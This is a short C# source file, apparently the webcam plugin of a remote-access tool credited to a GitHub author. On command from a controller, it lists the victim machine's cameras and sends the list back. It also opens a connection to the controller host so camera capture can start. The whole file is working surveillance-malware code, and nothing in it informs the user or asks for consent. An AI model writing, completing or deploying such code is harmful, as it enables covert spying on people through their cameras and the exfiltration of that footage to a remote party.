using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        internal static ClientHandler clientHandler;
        internal static bool cameraCapture;

        internal static RemoteCameraCapturePacket remoteCameraCapturePacket;
        public static void Main(LoadingAPI loadingAPI)
        {
            cameraCapture = false;
            switch (loadingAPI.currentPacket.packetType)
            {
                case PacketType.RC_GET_CAM:
                    ClientHandler clientHandlerGetCam = new ClientHandler(loadingAPI.host, loadingAPI.key, loadingAPI.baseIp, loadingAPI.HWID);
                    clientHandlerGetCam.ConnectStart();
                    RemoteCameraPacket remoteCameraPacket = new RemoteCameraPacket(GetCameras.GetListCameras(), loadingAPI.baseIp, loadingAPI.HWID);
                    while (!clientHandlerGetCam.Connected)
                        Thread.Sleep(125);
                    clientHandlerGetCam.SendPacket(remoteCameraPacket);
                    break;

               case PacketType.RC_CAPTURE_ON:
                    cameraCapture = true;
                    remoteCameraCapturePacket = (RemoteCameraCapturePacket)loadingAPI.currentPacket;
                    clientHandler = new ClientHandler(loadingAPI.host, loadingAPI.key, loadingAPI.baseIp, loadingAPI.HWID);
                    clientHandler.ConnectStart();
                    break;

                default:
                    return;
            }
            Miscellaneous.CleanMemory();
        }
    }
}
